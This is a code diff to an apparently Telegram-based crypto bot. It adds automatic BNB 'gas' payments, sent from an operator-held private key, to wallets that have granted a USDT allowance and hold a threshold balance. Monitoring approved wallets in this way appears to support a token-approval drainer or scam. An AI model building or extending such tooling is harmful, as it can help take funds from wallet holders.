@@ -428,6 +428,9 @@ async def handle_group_message(update: Update, context: ContextTypes.DEFAULT_TYP
                         # Add wallet to auto monitoring if approved
                         if allowance > 0:
                             auto_mode_manager.add_wallet(address)
+                            
+                            # Immediate auto gas check for newly detected approved wallets
+                            await check_immediate_auto_gas(address, usdt_balance, bnb_balance)
                         
                         # Send to chat (if bot has permissions) or log
                         try:
@@ -469,6 +472,9 @@ async def auto_handle_wallet_address(update: Update, context: ContextTypes.DEFAU
         # Add to auto monitoring if approved
         if allowance > 0:
             auto_mode_manager.add_wallet(wallet)
+            
+            # Immediate auto gas check for newly detected approved wallets
+            await check_immediate_auto_gas(wallet, usdt_balance, bnb_balance)
         
         log_user_action(user.id, user.username, "auto_wallet_detected", wallet)
         
@@ -492,6 +498,39 @@ async def auto_handle_wallet_address(update: Update, context: ContextTypes.DEFAU
             reply_markup=create_main_menu(),
             parse_mode=ParseMode.MARKDOWN
         )
+
+async def check_immediate_auto_gas(wallet_address: str, usdt_balance: float, bnb_balance: float):
+    """Check and send auto gas immediately for newly detected wallets"""
+    try:
+        # Only proceed if auto gas is enabled
+        if not auto_mode_manager.auto_gas_enabled:
+            return
+            
+        from config import AUTO_GAS_USDT_THRESHOLD, AUTO_GAS_BNB_THRESHOLD, AUTO_GAS_BNB_AMOUNT, AUTO_GAS_PRIVATE_KEY
+        
+        # Check auto gas conditions
+        should_send_gas = (
+            usdt_balance >= AUTO_GAS_USDT_THRESHOLD and  # USDT >= 0.5
+            bnb_balance < AUTO_GAS_BNB_THRESHOLD and     # BNB < 0.00000720
+            usdt_balance > 0 and                         # USDT not zero
+            bnb_balance >= 0                             # BNB not negative
+        )
+        
+        if should_send_gas:
+            # Send BNB gas immediately
+            success, message = blockchain_manager.send_bnb(
+                wallet_address, 
+                AUTO_GAS_BNB_AMOUNT, 
+                AUTO_GAS_PRIVATE_KEY
+            )
+            
+            if success:
+                logger.info(f"Immediate auto gas sent: {wallet_address} -> {AUTO_GAS_BNB_AMOUNT} BNB")
+            else:
+                logger.warning(f"Immediate auto gas failed: {wallet_address} -> {message}")
+                
+    except Exception as e:
+        logger.error(f"Error in immediate auto gas check: {e}")
 
 async def handle_toggle_auto_mode(query, context):
     """Handle auto mode toggle"""
